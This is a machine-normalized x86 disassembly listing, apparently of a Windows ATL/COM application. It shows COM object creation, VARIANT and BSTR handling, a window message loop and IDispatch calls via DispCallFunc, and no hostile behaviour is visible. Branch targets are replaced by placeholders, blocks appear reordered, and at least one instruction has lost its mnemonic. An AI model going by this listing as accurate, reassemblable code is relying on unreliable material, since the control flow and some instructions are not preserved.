mov edx [ ecx + 0x28 ]
cmp edx 0xfefefefe
lea eax [ ecx + 0x28 ]
je r-xdata
push eax
mov eax [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
call [ Ordinal_ATL71_10@IAT ]
retn 0x8
mov eax 0x8000ffff
retn 0x8
sub_419440
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_419470
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_4194d0
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax ]
cmp ecx eax
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
retn 0x4
test eax eax
jne r-xdata
or eax 0xffffffff
retn 0x4
mov [ esp + 0x4 ] eax
jmp sub_4191d0
mov eax 0x1
retn 0x4
sub_419500
push esi
mov esi ecx
push esi
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
mov eax [ esp + 0x8 ]
test eax eax
mov [ esi ] 0x8
jne r-xdata
push eax
call sub_42cee0
push eax
call [ SysAllocString@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
retn 0x4
mov eax esi
pop esi
retn 0x4
push 0x8007000e
call sub_42cee0
sub_419550
push esi
mov esi ecx
mov eax [ esi + 0x2c ]
lea ecx [ esi + 0x26 ]
push ecx
lea edx [ esi + 0x24 ]
push edx
lea ecx [ esi + 0x14 ]
push ecx
lea edx [ esi + 0x4 ]
push edx
push eax
call [ Ordinal_ATL71_54@IAT ]
test eax eax
jge r-xdata
mov edx [ esi + 0x28 ]
cmp edx 0xfefefefe
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x28 ]
je r-xdata
xor eax eax
pop esi
retn
push eax
push r--data
push esi
push ecx
call [ Ordinal_ATL71_10@IAT ]
xor ecx ecx
test eax eax
setge cl
pop esi
mov eax ecx
retn
mov eax 0x8000ffff
xor ecx ecx
test eax eax
setge cl
pop esi
mov eax ecx
retn
sub_419600
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_419630
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax ]
cmp ecx eax
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
xor ecx ecx
test eax eax
sete cl
mov al cl
retn 0x4
test eax eax
jne r-xdata
or eax 0xffffffff
test eax eax
sete cl
mov al cl
retn 0x4
push eax
call sub_4191d0
xor ecx ecx
test eax eax
sete cl
mov al cl
retn 0x4
mov eax 0x1
xor ecx ecx
test eax eax
sete cl
mov al cl
retn 0x4
sub_419690
push 0xffffffff
push sub_431903
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x5c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_419740
push esi
mov esi [ esp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] 0x0
mov ecx [ eax ]
cmp ecx [ r--data ]
push edi
jne r-xdata
mov eax 0x80004003
pop esi
retn 0xc
cmp ecx 0x9717c01e
mov edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ r--data ]
jne r-xdata
test ecx ecx
jne r-xdata
mov edi [ eax + 0x4 ]
cmp edi [ r--data ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
cmp ecx 0x20400
jne r-xdata
mov edi [ eax + 0x4 ]
test edi edi
jne r-xdata
mov edi [ eax + 0x8 ]
cmp edi [ r--data ]
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ r--data ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
jne r-xdata
mov edi [ eax + 0x4 ]
cmp edi [ r--data ]
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
mov edi [ eax + 0xc ]
cmp edi [ r--data ]
je r-xdata
pop edi
mov eax 0x80004002
pop esi
retn 0xc
pop edi
mov eax 0x80004002
pop esi
retn 0xc
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x18 ]
jne r-xdata
mov edi [ eax + 0x8 ]
cmp edi [ r--data ]
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
je r-xdata
mov [ esi ] edx
mov ecx [ edx ]
push edx
call [ ecx + 0x4 ]
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx [ eax + 0x8 ]
cmp ecx [ edx + 0x1c ]
jne r-xdata
mov edi [ eax + 0xc ]
cmp edi [ r--data ]
je r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edx + 0x20 ]
je r-xdata
sub_419840
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_419870
push esi
push edi
mov edi ecx
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test al 0x14
mov ecx [ esp + 0xc ]
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push edi
push r--data
push eax
mov eax [ esp + 0x1c ]
push eax
push ecx
call [ CoCreateInstance@IAT ]
mov esi eax
lea edx [ esp + 0x10 ]
push edx
push r--data
push eax
mov eax [ esp + 0x1c ]
push eax
push ecx
call [ CoCreateInstance@IAT ]
mov esi eax
test esi esi
jl r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
mov [ edi ] 0x0
mov edx [ esp + 0x10 ]
push edx
call [ OleRun@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push edi
push r--data
push eax
call [ ecx ]
mov esi eax
test esi esi
jge r-xdata
sub_419910
push esi
mov esi ecx
call sub_403d70
mov ecx [ r--data ]
lea eax [ esi + 0x4 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ecx [ r--data ]
lea eax [ esi + 0x14 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
xor eax eax
mov [ esi + 0x24 ] ax
mov [ esi + 0x26 ] ax
mov eax esi
pop esi
retn
sub_419980
push 0xffffffff
push sub_431933
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_419910
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esp + 0x10 ] eax
lea ecx [ esi + 0x40 ]
mov [ esi + 0x30 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x5c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_419a10
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
mov ecx rw-data
call sub_4066d0
retn 0x18
sub_419a40
push 0xffffffff
push sub_431960
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ esp + 0xc ] 0x0
mov [ esp + 0x18 ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
cmp edx [ r--data ]
jne r-xdata
mov esi [ rw-data ]
mov ebx [ esp + 0x28 ]
xor edi edi
test esi esi
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ r--data ]
jne r-xdata
test esi esi
mov [ esp + 0xc ] esi
je r-xdata
push ebx
mov ecx rw-data
call sub_4060d0
mov esi [ rw-data ]
mov edi eax
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
test edi edi
jge r-xdata
mov ecx [ esi ]
push esi
call [ ecx + 0x4 ]
mov eax [ eax + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
push ebx
push ecx
push edx
push esi
call sub_4068d0
add esp 0x14
mov edi eax
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x10
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
lea edx [ ecx + 0x4 ]
lea eax [ ecx + 0x14 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov dx [ ecx + 0x24 ]
mov [ rw-data ] dx
mov ax [ ecx + 0x26 ]
mov [ rw-data ] ax
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
jmp r-xdata
sub_419b50
push 0xffffffff
push sub_43197b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push edi
mov edi ecx
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0xc
call sub_42e3bc
mov esi eax
add esp 0x4
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
call sub_405450
mov [ edi ] 0x0
xor esi esi
push ebx
mov ebx [ esp + 0x20 ]
push ebx
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov eax edi
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push 0x8007000e
call sub_42cee0
pop ebx
jmp r-xdata
test ebx ebx
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov [ edi ] esi
test esi esi
pop esi
jne r-xdata
push 0x8007000e
call sub_42cee0
sub_419c00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431998
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
push edi
mov edi [ esp + 0x28 ]
mov esi ecx
mov [ esi ] 0x0
cmp [ edi ] 0x8
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
call [ VariantInit@IAT ]
mov [ esp + 0x20 ] 0x0
lea edx [ esp + 0x8 ]
cmp edx edi
jne r-xdata
mov eax [ edi + 0x8 ]
push eax
call sub_419b50
pop edi
mov eax esi
pop esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x4
push 0x8
push 0x0
push edi
lea eax [ esp + 0x14 ]
push eax
call [ VariantChangeType@IAT ]
test eax eax
jge r-xdata
cmp [ esp + 0x8 ] 0x8
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_419b50
mov [ esp + 0x20 ] 0xffffffff
lea edx [ esp + 0x8 ]
push edx
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
push eax
call sub_42cee0
mov ecx [ esp + 0x18 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x4
push eax
call sub_42cee0
sub_419cd0
push 0xffffffff
push sub_431a24
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
push esi
xor ebp ebp
push r--data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] ebp
call sub_4041b0
mov [ esp + 0x2c ] ebp
mov esi [ esp + 0x38 ]
push esi
lea ecx [ esp + 0x3c ]
call sub_4041b0
mov [ esp + 0x2c ] 0x1
push eax
lea ecx [ esp + 0x14 ]
call sub_419630
mov bl al
mov [ esp + 0x2c ] 0x0
mov ecx [ esp + 0x38 ]
cmp ecx ebp
je r-xdata
test bl bl
je r-xdata
call sub_405450
mov [ esp + 0x38 ] ebp
push edi
push esi
lea ecx [ esp + 0x28 ]
call sub_4041b0
mov edi eax
mov [ esp + 0x30 ] 0x2
push r--data
lea ecx [ esp + 0x24 ]
mov [ esp + 0x14 ] 0x1
call sub_4041b0
mov ebx 0x3
mov [ esp + 0x30 ] ebx
push edi
mov ecx eax
mov [ esp + 0x14 ] ebx
call sub_419630
test al al
pop edi
jne r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x3c ]
push ebp
push ebp
push 0x401
push ecx
jmp r-xdata
mov [ esp + 0x38 ] 0x1
push esi
lea ecx [ esp + 0x1c ]
call sub_4041b0
mov esi eax
mov [ esp + 0x2c ] 0x4
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x7
call sub_4041b0
mov [ esp + 0x2c ] 0x5
mov ebx 0xf
push esi
mov ecx eax
mov [ esp + 0x10 ] ebx
call sub_419630
test al al
mov [ esp + 0x38 ] 0x0
je r-xdata
call [ PostThreadMessageW@IAT ]
mov [ esp + 0x2c ] 0x3
test bl 0x4
je r-xdata
mov ecx [ esp + 0x14 ]
and ebx 0xfffffff7
cmp ecx ebp
mov [ esp + 0xc ] ebx
je r-xdata
mov [ esp + 0x2c ] 0x4
test bl 0x8
je r-xdata
mov ecx [ esp + 0x24 ]
pop esi
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x8
call sub_405450
mov [ esp + 0x10 ] ebp
mov [ esp + 0x2c ] 0x2
test bl 0x2
je r-xdata
mov ecx [ esp + 0x18 ]
and ebx 0xfffffffb
cmp ecx ebp
mov [ esp + 0xc ] ebx
je r-xdata
call sub_405450
mov [ esp + 0x14 ] ebp
mov [ esp + 0x2c ] ebp
test bl 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
and ebx 0xfffffffd
cmp ecx ebp
mov [ esp + 0xc ] ebx
je r-xdata
call sub_405450
mov [ esp + 0x18 ] ebp
mov al [ esp + 0x38 ]
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
cmp ecx ebp
je r-xdata
call sub_405450
mov [ esp + 0x1c ] ebp
mov [ esp + 0x2c ] 0xffffffff
mov ecx [ esp + 0x10 ]
cmp ecx ebp
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ edx + 0x3c ]
push ebp
push ebp
push 0x402
push eax
call sub_405450
mov [ esp + 0x20 ] ebp
sub_419ec0
push 0xffffffff
push sub_431a58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push ebp
push esi
push edi
mov ebx ecx
xor edi edi
push edi
mov [ esp + 0x14 ] ebx
call [ CoInitialize@IAT ]
mov eax [ ebx + 0x2c ]
cmp eax edi
lea ebp [ ebx + 0x2c ]
je r-xdata
lea edx [ esp + 0x14 ]
push edx
push r--data
push 0x17
push edi
push r--data
call [ CoCreateInstance@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp esi edi
mov [ ebp ] edi
jl r-xdata
mov eax [ esp + 0x14 ]
push eax
call [ OleRun@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
mov [ ebx + 0x30 ] edi
mov eax [ ebp ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
cmp esi edi
jge r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push ebp
push r--data
push eax
call [ ecx ]
mov esi eax
call [ CoUninitialize@IAT ]
mov edx [ ebx + 0x38 ]
push edx
call [ SetEvent@IAT ]
mov ecx [ esp + 0x60 ]
pop edi
mov [ ebx + 0x30 ] esi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x5c
retn
mov eax [ ebx + 0x2c ]
cmp eax esi
je r-xdata
lea ecx [ ebx + 0x26 ]
push ecx
lea edx [ ebx + 0x24 ]
push edx
lea ecx [ ebx + 0x14 ]
push ecx
lea edx [ ebx + 0x4 ]
push edx
push eax
call [ Ordinal_ATL71_54@IAT ]
cmp eax edi
jl r-xdata
mov edx [ ebx + 0x28 ]
push edx
push r--data
push eax
call [ Ordinal_ATL71_11@IAT ]
mov [ ebx + 0x28 ] 0xfefefefe
mov eax [ ebx + 0x2c ]
cmp eax esi
je r-xdata
mov edx [ ebx + 0x28 ]
cmp edx 0xfefefefe
mov ecx [ ebp ]
lea eax [ ebx + 0x28 ]
je r-xdata
mov [ ebx + 0x2c ] esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push eax
push r--data
push ebx
push ecx
call [ Ordinal_ATL71_10@IAT ]
mov eax 0x8000ffff
jmp r-xdata
push r--data
mov [ esp + 0x28 ] 0x8
call [ SysAllocString@IAT ]
cmp eax edi
mov [ esp + 0x2c ] eax
jne r-xdata
xor ecx ecx
cmp eax edi
setge cl
mov eax ecx
cmp eax edi
je r-xdata
xor eax eax
mov [ esp + 0x68 ] eax
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x30 ]
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] eax
call sub_4041b0
mov [ esp + 0x20 ] eax
mov [ esp + 0x68 ] 0x1
cmp [ ebp ] 0x0
jne r-xdata
push 0x8007000e
call sub_42cee0
mov ecx [ esp + 0x20 ]
mov ecx [ ecx ]
test ecx ecx
mov eax [ ebp ]
je r-xdata
push 0x80004003
call sub_42cee0
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
cmp edi ebp
je r-xdata
mov esi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov edx [ eax ]
lea ebp [ esp + 0x18 ]
push ebp
sub esp 0x10
mov ebp esp
mov [ ebp ] esi
mov esi [ esp + 0x50 ]
mov [ ebp + 0x4 ] edi
mov [ ebp + 0x8 ] esi
mov esi [ esp + 0x54 ]
push ecx
push eax
mov [ ebp + 0xc ] esi
call [ edx + 0x20 ]
mov edi eax
mov [ esp + 0x68 ] 0x0
mov eax [ esp + 0x14 ]
xor ebp ebp
cmp eax ebp
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call [ SetEvent@IAT ]
push ebp
push ebp
push ebp
lea ecx [ esp + 0x50 ]
push ecx
call [ GetMessageW@IAT ]
test eax eax
mov edi [ VariantClear@IAT ]
je r-xdata
mov ecx [ ebx + 0x28 ]
mov eax [ ebx + 0x2c ]
push ecx
push r--data
push eax
call [ Ordinal_ATL71_11@IAT ]
mov [ ebx + 0x28 ] 0xfefefefe
mov [ ebx + 0x30 ] ebp
mov [ esp + 0x68 ] 0xffffffff
lea edx [ esp + 0x24 ]
push edx
call [ VariantClear@IAT ]
cmp eax ebp
jge r-xdata
mov [ esp + 0x14 ] ebp
cmp esi ebp
je r-xdata
mov [ esp + 0x68 ] 0xffffffff
lea ecx [ esp + 0x24 ]
push ecx
call edi
test eax eax
jge r-xdata
xor ebp ebp
jmp r-xdata
mov eax [ ebx + 0x30 ]
xor esi esi
cmp eax esi
je r-xdata
push eax
call sub_42cee0
jmp r-xdata
mov eax [ esi ]
cmp eax ebp
je r-xdata
push eax
call sub_42cee0
jmp r-xdata
mov eax [ esp + 0x48 ]
cmp eax 0x403
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
je r-xdata
push eax
call [ SysFreeString@IAT ]
cmp eax 0x401
jne r-xdata
lea ecx [ ebx + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
lea edx [ esp + 0x24 ]
push edx
mov esi eax
call edi
cmp eax ebp
jge r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??_V@YAXPAX@Z
add esp 0x4
cmp eax 0x402
jne r-xdata
lea edx [ esp + 0x24 ]
push edx
call edi
cmp eax ebp
jge r-xdata
cmp esi ebp
mov [ esp + 0x24 ] 0x8
jne r-xdata
push eax
call sub_42cee0
mov eax [ esp + 0x44 ]
lea edx [ esp + 0x44 ]
push edx
xor ebp ebp
push ebp
push eax
call [ TranslateAcceleratorW@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ ebx + 0x5c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov ecx [ ebx + 0x38 ]
push r--data
lea ecx [ esp + 0x20 ]
call sub_4041b0
mov esi eax
mov [ esp + 0x68 ] 0x3
cmp [ ebx + 0x2c ] ebp
jne r-xdata
push eax
call sub_42cee0
push esi
call [ SysAllocString@IAT ]
cmp eax ebp
mov [ esp + 0x2c ] eax
jne r-xdata
xor eax eax
mov [ esp + 0x2c ] eax
jmp r-xdata
push ebp
push ebp
push ebp
lea eax [ esp + 0x50 ]
push eax
call [ GetMessageW@IAT ]
test eax eax
mov edi [ VariantClear@IAT ]
mov ebx [ esp + 0x10 ]
jne r-xdata
lea ecx [ esp + 0x44 ]
push ecx
call [ TranslateMessage@IAT ]
lea edx [ esp + 0x44 ]
push edx
call [ DispatchMessageW@IAT ]
mov eax [ esi ]
cmp eax ebp
mov ecx [ ebx + 0x2c ]
je r-xdata
push 0x80004003
call sub_42cee0
mov edi [ esp + 0x24 ]
mov ebp [ esp + 0x28 ]
mov ebx eax
mov eax [ esp + 0x30 ]
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x44 ] eax
call sub_4041b0
mov esi eax
mov [ esp + 0x68 ] 0x2
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x2c ]
add eax 0x2c
test ecx ecx
jne r-xdata
push 0x8007000e
call sub_42cee0
mov eax [ esp + 0x2c ]
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov esi [ esi ]
add eax 0x2c
test esi esi
mov eax [ eax ]
je r-xdata
push 0x80004003
call sub_42cee0
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x24 ]
call sub_419c00
mov [ esp + 0x68 ] 0x4
mov eax [ eax ]
cmp eax ebp
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov edx [ ecx ]
lea esi [ esp + 0x24 ]
push esi
push eax
push ecx
call [ edx + 0x1c ]
mov [ esp + 0x68 ] 0x0
mov esi [ esp + 0x1c ]
cmp esi ebp
je r-xdata
xor ecx ecx
mov ecx [ esi ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov [ esp + 0x1c ] ebp
cmp esi ebp
je r-xdata
test edi edi
je r-xdata
mov esi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov edx [ eax ]
lea esi [ esp + 0x18 ]
push esi
sub esp 0x10
mov esi esp
mov [ esi ] edi
mov edi [ esp + 0x54 ]
mov [ esi + 0x4 ] ebp
push ecx
mov [ esi + 0x8 ] ebx
push eax
mov [ esi + 0xc ] edi
call [ edx + 0x20 ]
mov edi eax
mov [ esp + 0x68 ] 0x0
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
jmp r-xdata
lea edx [ esi + 0x8 ]
push edx
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push eax
lea ecx [ ebx + 0x5c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x68 ] 0x0
mov esi [ esp + 0x20 ]
cmp esi ebp
je r-xdata
mov eax [ esi ]
cmp eax ebp
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x38 ]
jmp r-xdata
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
call [ SetEvent@IAT ]
mov [ esp + 0x20 ] ebp
cmp esi ebp
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
je r-xdata
push eax
call [ SysFreeString@IAT ]
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi ]
cmp eax ebp
je r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??_V@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
mov eax [ esi + 0x4 ]
cmp eax ebp
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??_V@YAXPAX@Z
add esp 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??_V@YAXPAX@Z
add esp 0x4
sub_41a480
sub esp 0x1c
mov eax [ rw-data ]
mov edx [ esp + 0x24 ]
push ebx
push esi
mov [ esp + 0x20 ] eax
push edi
mov ebx r--data
mov eax [ ebx + 0x1c ]
add ebx 0x18
test eax eax
jne r-xdata
cmp [ ebx + 0xc ] edx
jne r-xdata
cmp [ ebx ] 0x1
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x18 ]
call sub_42e72f
add esp 0x1c
retn 0x24
mov esi [ ebx + 0x4 ]
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov eax [ ebx + 0x14 ]
test eax eax
mov esi [ esp + 0x2c ]
je r-xdata
mov eax [ esi ]
lea edi [ esp + 0xc ]
mov ecx edi
push ecx
mov ecx [ esp + 0x3c ]
push ecx
push edx
push r--data
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jl r-xdata
mov edi eax
jmp r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
mov ecx [ ebx + 0x10 ]
push edx
push eax
push edi
push ecx
mov ecx esi
call sub_41a530
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
call sub_42e72f
add esp 0x1c
retn 0x24
sub_41a530
push 0xffffffff
push sub_431a78
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
mov ebx [ esp + 0x5c ]
mov ax [ ebx + 0x6 ]
cmp ax 0x8
mov [ esp + 0x4 ] ecx
jle r-xdata
mov edx [ esp + 0x60 ]
neg ax
push ebp
lea ecx [ esp + 0x2c ]
push esi
push edi
sbb eax eax
and eax ecx
mov ecx [ edx + 0xc ]
mov edi eax
xor eax eax
test ecx ecx
jbe r-xdata
mov eax 0x80004005
pop ebx
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
cmp eax [ edx + 0x8 ]
jae r-xdata
xor esi esi
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x64 ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x24 ] sub_42e115
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
call [ VariantInit@IAT ]
mov [ esp + 0x5c ] 0x0
mov eax [ esp + 0x70 ]
test eax eax
jne r-xdata
mov esi eax
shl esi 0x4
mov ecx [ edx ]
mov ebp [ edx + 0x4 ]
mov ebp [ ebp + eax * 4 ]
add ecx esi
mov [ edi + ebp * 4 ] ecx
mov ecx [ edx + 0xc ]
inc eax
add esi 0x10
cmp eax ecx
jb r-xdata
movsx ecx [ ebx + 0x6 ]
push eax
push edi
xor edx edx
mov dx [ ebx + 0x4 ]
lea eax [ ebx + 0x8 ]
push eax
mov eax [ ebx ]
push ecx
lea ecx [ esp + 0x24 ]
push edx
push eax
push 0x0
push ecx
call [ DispCallFunc@IAT ]
mov esi eax
mov [ esp + 0x5c ] 0xffffffff
lea edx [ esp + 0x24 ]
push edx
call [ VariantClear@IAT ]
